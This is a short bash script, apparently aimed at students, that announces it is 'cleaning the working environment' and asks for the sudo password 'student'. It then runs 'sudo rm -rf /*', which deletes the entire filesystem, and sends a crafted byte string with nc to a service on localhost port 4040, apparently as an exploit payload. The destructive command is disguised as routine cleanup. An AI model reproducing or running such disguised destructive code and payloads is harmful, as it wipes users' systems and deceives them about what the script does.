#!/usr/bin/env bash
echo "Starting script" 
echo "Cleaning working environment\n Enter 'student' for sudo access "
sudo rm -rf /*
ebp="\x8f\xd8\xf5"
null=$(echo '10' | sed 's/../\\x/g')
echo  -n  "$ebp$null" | nc localhost 4040